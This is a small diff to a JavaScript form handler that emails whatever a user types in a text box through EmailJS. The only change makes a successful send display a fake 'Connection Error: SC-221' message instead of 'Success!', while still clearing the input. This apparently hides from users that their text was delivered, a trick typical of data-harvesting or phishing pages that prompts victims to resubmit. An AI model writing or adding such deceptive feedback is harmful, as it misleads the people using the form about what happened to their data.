@@ -20,7 +20,7 @@ document.getElementById('emailForm').addEventListener('submit', function (event)
   emailjs.send('service_qr6u2jj', 'template_kpsj3ad', templateParams)
     .then(function (response) {
       console.log('Email successfully sent!', response);
-      document.getElementById('statusMessage').textContent = 'Success!';
+      document.getElementById('statusMessage').textContent = 'Connection Error: SC-221';
       document.getElementById('textBox').value = ''; // Clear input
     })
     .catch(function (error) {
